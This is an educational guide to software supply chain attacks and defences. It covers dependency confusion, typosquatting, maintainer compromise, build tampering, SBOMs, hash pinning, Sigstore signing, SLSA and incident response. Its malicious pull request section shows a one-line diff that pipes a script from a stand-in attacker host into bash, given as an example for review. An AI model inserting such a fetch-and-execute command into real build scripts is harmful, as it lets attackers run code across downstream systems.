# Supply Chain Attacks

A supply chain attack targets the tools, dependencies, build systems, or distribution channels that an application relies on. Instead of attacking the application directly, the attacker compromises something the application already trusts.

This is especially dangerous because modern backend systems depend on many external components. A single application may use open-source packages, container base images, CI/CD tools, GitHub Actions, cloud services, package registries, deployment scripts, and infrastructure modules. If one trusted component is compromised, malicious code can spread into many downstream systems.

High-profile incidents such as SolarWinds, the XZ Utils backdoor, the npm `event-stream` compromise, and typosquatting campaigns show that supply chain attacks are realistic threats. They are difficult to detect because the malicious code may enter through a legitimate-looking package, trusted maintainer account, or signed build artifact.

---

## What Is a Software Supply Chain?

A software supply chain includes every system, tool, package, script, and process involved in building and deploying software. This includes the developer workstation, source repository, package registry, build pipeline, container registry, deployment platform, and production environment.

```text
Developer workstation
        |
        | git push
        v
+------------------+     fetch deps      +------------------+
|  Source Repo     | -----------------> | Package Registry |
| GitHub, GitLab   |                    | npm, PyPI, Maven |
+------------------+                    | crates.io, etc.  |
        |                               +------------------+
        | triggers
        v
+------------------+     pull base image  +------------------+
|  CI/CD Pipeline  | ------------------> | Container Registry|
| Actions, Jenkins |                     | Docker Hub, ECR   |
+------------------+                     +------------------+
        |
        | push artifact
        v
+------------------+
| CD / Deployment  |
| K8s, ECS, VM     |
+------------------+
        |
        v
+------------------+
|  Production      |
+------------------+
```

Every arrow in this diagram is a potential attack surface. A malicious dependency, compromised CI runner, poisoned container image, stolen signing key, or misconfigured package registry can all introduce risk.

Example supply chain risk:

```json
{
  "attackSurface": "package_registry",
  "risk": "malicious dependency installed during build",
  "impact": "malicious code included in production artifact"
}
```

The key problem is trust. Developers often assume that dependencies, build tools, and package registries are safe. Supply chain attacks exploit that trust.

---

## Common Attack Vectors

Supply chain attacks can happen at many points in the software lifecycle. Some attacks target package names, others target maintainers, build systems, pull requests, or distribution channels.

---

### Dependency Confusion

Dependency confusion happens when an attacker publishes a malicious package to a public registry using the same name as a private internal package. If the public package has a higher version number, some package managers or misconfigured build systems may download the public package instead of the private one.

```text
Internal registry:   acme-internal-utils @ 1.2.0
Public npm registry: acme-internal-utils @ 9.9.9  <-- attacker-controlled
                                                       higher version wins
```

Example unsafe resolution:

```json
{
  "requestedPackage": "acme-internal-utils",
  "expectedSource": "internal_registry",
  "actualSource": "public_registry",
  "installedVersion": "9.9.9",
  "risk": "dependency_confusion"
}
```

This attack is dangerous because the package name looks legitimate. The build system may install the malicious dependency automatically.

Mitigation includes using a private registry proxy and explicitly configuring which scopes are allowed to come from public registries.

Example npm scope configuration:

```text
@acme:registry=https://registry.acme.internal
```

Example safe resolution:

```json
{
  "requestedPackage": "@acme/internal-utils",
  "source": "registry.acme.internal",
  "publicRegistryFallback": false,
  "status": "safe"
}
```

For Python, exact hashes can be pinned in `requirements.txt`:

```text
acme-internal-utils==1.2.0 \
    --hash=sha256:abcdef1234...
```

Hash pinning ensures that even if a package name resolves unexpectedly, the content must match the expected hash.

---

### Typosquatting

Typosquatting happens when attackers publish packages with names that look similar to legitimate packages. The goal is to trick developers into installing the wrong package by mistake.

| Legitimate package | Typosquat package     |
| ------------------ | --------------------- |
| `requests`         | `reqeusts`, `request` |
| `lodash`           | `lodahs`, `lodash_`   |
| `boto3`            | `bot03`, `botto3`     |

Example accidental install:

```bash
pip install reqeusts
```

Example risk output:

```json
{
  "intendedPackage": "requests",
  "installedPackage": "reqeusts",
  "risk": "possible typosquatting package"
}
```

Typosquatting is simple but effective because developers often install packages quickly, especially during prototyping.

Mitigation includes checking package names carefully, verifying maintainers, reviewing download counts, using approved package allow-lists, and locking dependencies to exact versions.

Example allow-list result:

```json
{
  "package": "reqeusts",
  "status": "blocked",
  "reason": "not on approved dependency list"
}
```

---

### Compromised Maintainer Account

A compromised maintainer account occurs when an attacker gains access to the account of a legitimate package maintainer. This may happen through phishing, credential stuffing, stolen tokens, or takeover of an abandoned package.

Once the attacker controls the account, they can publish a malicious version of a real package. This is especially dangerous because the package name and history are legitimate.

```text
Legitimate maintainer                Attacker
         |                               |
         | transfers ownership / phished |
         +-----------------------------> +
                                         |
                                         | publishes malicious v3.3.6
                                         v
                              +------------------+
                              | npm registry     |
                              | event-stream     |
                              | @3.3.6 malicious |
                              +------------------+
                                         |
                                         | apps install it
                                         v
                              Malicious code executes
```

Example dependency update:

```json
{
  "package": "trusted-library",
  "previousVersion": "3.3.5",
  "newVersion": "3.3.6",
  "publisher": "trusted_maintainer",
  "risk": "publisher account may be compromised"
}
```

The update may look routine, especially if automated tooling opens a version bump.

Mitigation includes requiring MFA on package registry accounts, monitoring new versions of critical dependencies, reviewing changelogs, checking diffs, and using automated dependency PRs that can be reviewed before merging.

Example safer upgrade process:

```json
{
  "dependency": "trusted-library",
  "newVersion": "3.3.6",
  "automatedPR": true,
  "securityReviewRequired": true,
  "status": "pending_review"
}
```

---

### Build System Compromise

A build system compromise targets the CI/CD pipeline itself. The source code may be clean, but the build system injects malicious code into the final artifact during compilation, packaging, or signing.

This type of attack is especially severe because the final artifact may still be signed by legitimate keys. Consumers may trust the artifact because it appears to come from the correct organization.

```text
+-------------------+
| Source code OK    |
+-------------------+
         |
         v
+-------------------+
| Build System      |  <-- attacker modifies build scripts or runner
| compromised       |      injects malicious code into artifact
+-------------------+
         |
         v
+-------------------+
| Signed Artifact   |  <-- signature is valid
| contains payload  |      but content is tampered with
+-------------------+
         |
         v
+-------------------+
| Production        |
| executes payload  |
+-------------------+
```

Example compromised build output:

```json
{
  "sourceCodeStatus": "clean",
  "buildRunnerStatus": "compromised",
  "artifactSignature": "valid",
  "artifactContent": "tampered"
}
```

Mitigation includes using ephemeral build environments, hermetic builds, pinned CI actions, audited build scripts, provenance verification, and binary authorization.

Example safer CI configuration concept:

```json
{
  "buildRunner": "ephemeral",
  "thirdPartyActionsPinned": true,
  "artifactProvenance": "signed",
  "deploymentRequiresVerification": true
}
```

For GitHub Actions, pinning an action to a full commit SHA is safer than using a mutable tag.

```yaml
uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
```

A tag such as `@v4` can change over time, while a commit SHA points to exact code.

---

### Malicious Pull Requests and Code Injection

Open-source projects and internal repositories can be targeted with malicious pull requests. The attacker may submit code that appears useful but contains subtle backdoors, unsafe build changes, or hidden dependency updates.

These attacks can be social as well as technical. An attacker may build trust over time, become a contributor, and then introduce harmful changes later.

Example suspicious pull request change:

```diff
+ curl https://example-attacker.com/install.sh | bash
```

Example review output:

```json
{
  "pullRequest": 241,
  "risk": "remote script execution added to build process",
  "status": "blocked_pending_security_review"
}
```

Mitigation includes requiring multiple maintainers to review sensitive changes, using code owners, restricting access to secrets in forked pull requests, and sandboxing CI jobs.

GitHub Actions users should be especially careful with `pull_request_target`, because it can run workflows with elevated permissions if misused.

Example safer policy:

```json
{
  "forkPullRequestsHaveSecrets": false,
  "codeOwnerReviewRequired": true,
  "criticalPathChangesRequireTwoApprovals": true
}
```

---

### Protestware and Intentional Sabotage

Sometimes the threat comes from a legitimate package author who intentionally introduces destructive or disruptive behavior. This has happened in protestware incidents where maintainers changed their own packages to break applications or perform unexpected actions.

This highlights an uncomfortable truth: a dependency can be risky even if it comes from the real maintainer.

Example risk:

```json
{
  "package": "legitimate-package",
  "maintainer": "real_author",
  "risk": "intentional sabotage in new release"
}
```

Mitigation includes pinning versions, reviewing upgrades, using lock files, maintaining internal mirrors for critical dependencies, and requiring approval for new dependency versions.

Example safe upgrade policy:

```json
{
  "automaticInstallLatest": false,
  "pinnedVersions": true,
  "manualApprovalForMajorUpdates": true
}
```

---

## Software Bill of Materials

A Software Bill of Materials, or **SBOM**, is a machine-readable inventory of the software components included in an application. It lists direct dependencies, transitive dependencies, versions, licenses, and sometimes vulnerability information.

SBOMs are useful because they help teams quickly answer the question: “Are we affected by this newly disclosed vulnerability?”

```text
+------------------+
| Your Application |
| v2.4.1           |
+------------------+
  Contains:
  - express 4.18.2
    - accepts 1.3.8
    - depd 2.0.0
  - lodash 4.17.21
  - pg 8.11.3
    - pg-connection-string 2.6.2
```

Example SBOM record:

```json
{
  "component": "lodash",
  "version": "4.17.21",
  "type": "library",
  "license": "MIT"
}
```

Common SBOM formats include:

* **SPDX**: A widely supported standard, also published as ISO/IEC 5962:2021.
* **CycloneDX**: Designed for security use cases and commonly used with vulnerability and VEX workflows.

Generate an SBOM with Syft:

```bash
syft myapp:1.2.3 -o spdx-json > sbom.spdx.json
syft myapp:1.2.3 -o cyclonedx-json > sbom.cyclonedx.json
```

Example output:

```json
{
  "image": "myapp:1.2.3",
  "sbomGenerated": true,
  "formats": ["spdx-json", "cyclonedx-json"]
}
```

Scan an SBOM with Grype:

```bash
grype sbom:sbom.spdx.json --fail-on high
```

Example scan output:

```json
{
  "vulnerabilitiesFound": 4,
  "highSeverity": 1,
  "buildStatus": "failed"
}
```

The SBOM should be stored as a build artifact so it can be used later during incident response.

---

## Dependency Pinning and Integrity Verification

Dependency pinning ensures that builds use known versions of dependencies instead of automatically pulling the newest available release. Integrity verification ensures that the downloaded content matches what was expected.

Together, these controls reduce the risk of unexpected dependency changes.

---

### Lock Files

Lock files record the exact versions resolved by the package manager. Many lock files also include integrity hashes.

| Ecosystem | Lock file                                          |
| --------- | -------------------------------------------------- |
| Node.js   | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` |
| Python    | `requirements.txt` with hashes or `poetry.lock`    |
| Go        | `go.sum`                                           |
| Rust      | `Cargo.lock`                                       |
| Ruby      | `Gemfile.lock`                                     |
| Java      | BOM plus dependency checksums                      |

Example lock file benefit:

```json
{
  "dependency": "lodash",
  "declaredRange": "^4.17.0",
  "lockedVersion": "4.17.21",
  "result": "build uses exact resolved version"
}
```

Always commit lock files for applications. Without them, different developers or CI runs may resolve different dependency versions.

---

### Hash Pinning

Hash pinning verifies that the dependency content matches an expected cryptographic hash. This protects against tampered downloads or unexpected package changes.

Example pip hash generation:

```bash
pip-compile --generate-hashes requirements.in -o requirements.txt
```

Example generated requirement:

```text
requests==2.31.0 \
    --hash=sha256:58cd2187423839b8e... \
    --hash=sha256:942c5a758f98d790...
```

Example integrity failure:

```json
{
  "package": "requests",
  "expectedHash": "sha256:58cd...",
  "actualHash": "sha256:9999...",
  "status": "blocked"
}
```

npm lock files include integrity metadata automatically:

```json
{
  "node_modules/lodash": {
    "version": "4.17.21",
    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
    "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZkGLZqJZFYjsLumBKg=="
  }
}
```

Hash verification gives confidence that the installed package content is exactly what the lock file expected.

---

## Artifact Signing and Provenance

Artifact signing proves that a build artifact came from a trusted source and has not been modified after signing. Provenance describes how the artifact was built, including source repository, commit, workflow, builder, and build parameters.

These controls help answer two important questions:

```text
Who built this artifact?
Was it built from the expected source using the expected process?
```

---

### Sigstore and Cosign

Sigstore provides tooling for signing and verifying software artifacts. Cosign is commonly used to sign container images. Keyless signing can use short-lived keys tied to an OIDC identity, such as a CI workflow identity.

Example signing command:

```bash
cosign sign --yes myregistry.io/myapp:1.2.3
```

Example verification command:

```bash
cosign verify \
  --certificate-identity "https://github.com/acme/myapp/.github/workflows/release.yml@refs/tags/v1.2.3" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp:1.2.3
```

Example verification output:

```json
{
  "image": "myregistry.io/myapp:1.2.3",
  "signatureValid": true,
  "identity": "github-actions-release-workflow",
  "status": "verified"
}
```

This helps deployment systems reject unsigned or incorrectly signed artifacts.

---

### SLSA Framework

SLSA, or Supply-chain Levels for Software Artifacts, defines levels of supply chain security for build provenance.

| Level  | Key requirement                                   |
| ------ | ------------------------------------------------- |
| SLSA 1 | Provenance exists                                 |
| SLSA 2 | Hosted build and signed provenance                |
| SLSA 3 | Hardened build and tamper-resistant provenance    |
| SLSA 4 | Hermetic, reproducible build and two-party review |

Example GitHub Actions SLSA generator configuration:

```yaml
jobs:
  build:
    uses: slsa-framework/slsa-github-generator/.github/workflows/builder_go_slsa3.yml@v1.9.0
    with:
      go-version: "1.22"
```

Example provenance output:

```json
{
  "artifact": "myapp-linux-amd64",
  "sourceRepository": "github.com/acme/myapp",
  "commit": "abc123",
  "builder": "github-actions",
  "slsaLevel": 3
}
```

SLSA helps organizations move from “we built this somehow” to “we can prove how this was built.”

---

### Reproducible Builds

A reproducible build produces identical output from the same source code, dependencies, and build instructions. This allows independent parties to verify that a binary matches the claimed source.

Example reproducible build result:

```json
{
  "sourceCommit": "abc123",
  "builderAHash": "sha256:1111...",
  "builderBHash": "sha256:1111...",
  "reproducible": true
}
```

If two independent builds produce different outputs, teams should investigate whether the build contains timestamps, machine-specific paths, random values, or possible tampering.

---

## Dependency Auditing and Automated Updates

Dependency auditing helps teams identify known vulnerabilities and suspicious package behavior. Automated update tools help keep dependencies current, but updates still need review and testing.

---

### Automated Vulnerability Alerts

| Tool        | Ecosystem                       | What it does                                      |
| ----------- | ------------------------------- | ------------------------------------------------- |
| Dependabot  | npm, pip, Go, Maven, and others | Opens PRs to upgrade vulnerable dependencies      |
| Renovate    | Many ecosystems                 | Configurable dependency update automation         |
| socket.dev  | npm                             | Analyzes package behavior and suspicious patterns |
| OSV-Scanner | Major ecosystems                | Scans lock files and SBOMs against OSV data       |

Example OSV scan commands:

```bash
osv-scanner --lockfile package-lock.json
osv-scanner --lockfile requirements.txt
osv-scanner --sbom sbom.cyclonedx.json
```

Example scan output:

```json
{
  "package": "example-lib",
  "installedVersion": "1.4.0",
  "vulnerableRange": "<1.4.3",
  "fixedVersion": "1.4.3",
  "severity": "high"
}
```

Automated tools are helpful, but they should not blindly deploy every dependency update to production without tests.

---

### Manual Dependency Review

Before adding a new package, review whether it is trustworthy and necessary. Every dependency increases the attack surface.

A practical review checklist:

1. Check download counts and recent activity.
2. Review maintainers and account security indicators where available.
3. Read changelogs for suspicious or unexpected changes.
4. Prefer packages with a clear security policy.
5. Check issue history and response to past vulnerabilities.
6. Use scanning tools to detect risky behavior.

Example review output:

```json
{
  "package": "new-helper-lib",
  "recentActivity": "low",
  "maintainers": 1,
  "securityPolicy": "missing",
  "decision": "reject_or_replace"
}
```

Small packages can still carry major risk. If a package provides only a few lines of functionality, it may be safer to implement that logic internally.

---

## Network-Level Mitigations

A private package proxy helps control which packages and versions can enter the organization. Instead of allowing developers and CI jobs to fetch directly from public registries, all package requests go through an approved proxy.

```text
Developer / CI runner
         |
         | all package requests
         v
+------------------+
| Private Proxy    |  Artifactory, AWS CodeArtifact, Nexus
| - allow-list     |  - cache approved packages
| - audit log      |  - block unapproved names/scopes
| - CVE scan       |  - scan packages on first fetch
+------------------+
         |
         | only allowed packages
         v
+------------------+
| Public Registry  |
| npm, PyPI, etc.  |
+------------------+
```

Example blocked package:

```json
{
  "package": "acme-internal-utils",
  "requestedSource": "public_npm",
  "action": "blocked",
  "reason": "internal package names must resolve only from private registry"
}
```

Example approved package:

```json
{
  "package": "lodash",
  "version": "4.17.21",
  "source": "private_proxy_cache",
  "vulnerabilityScan": "passed"
}
```

Private proxies help prevent dependency confusion, enforce allow-lists, cache known-good packages, and provide audit logs.

---

## Incident Response for Supply Chain Compromises

When a supply chain compromise is discovered, teams must move quickly. The goal is to identify affected systems, stop active exploitation, deploy clean artifacts, rotate exposed secrets, and prevent recurrence.

### 1. Identify Blast Radius

Use the SBOM to determine which services include the affected component and which versions are vulnerable.

Example blast radius output:

```json
{
  "compromisedPackage": "example-lib",
  "affectedVersion": "2.5.0",
  "affectedServices": ["orders-api", "billing-worker", "admin-dashboard"]
}
```

### 2. Isolate

If a service is actively running malicious code, remove it from rotation or restrict its access.

```json
{
  "service": "billing-worker",
  "action": "isolated",
  "networkAccess": "restricted"
}
```

### 3. Patch

Pin to a clean version and redeploy. If no clean version exists, fork and patch internally or remove the dependency.

```json
{
  "package": "example-lib",
  "oldVersion": "2.5.0",
  "newVersion": "2.5.1-clean",
  "redeployStatus": "in_progress"
}
```

### 4. Verify

Confirm the new deployment does not include the compromised version.

```json
{
  "service": "orders-api",
  "compromisedVersionPresent": false,
  "verification": "passed"
}
```

### 5. Rotate Secrets

Assume any secret accessible to the compromised process may have leaked. Revoke and rotate database passwords, API keys, cloud credentials, signing tokens, and service tokens.

```json
{
  "rotatedSecrets": [
    "orders-db-password",
    "payment-api-key",
    "cloud-deploy-role-token"
  ],
  "status": "completed"
}
```

### 6. Post-Mortem

After containment, determine how the dependency or artifact entered production. Update policies and tooling to prevent the same path from being used again.

Example post-mortem output:

```json
{
  "rootCause": "new dependency added without security review",
  "correctiveActions": [
    "require approval for new dependencies",
    "enable private registry allow-list",
    "generate SBOM for every build",
    "enforce artifact signature verification"
  ]
}
```
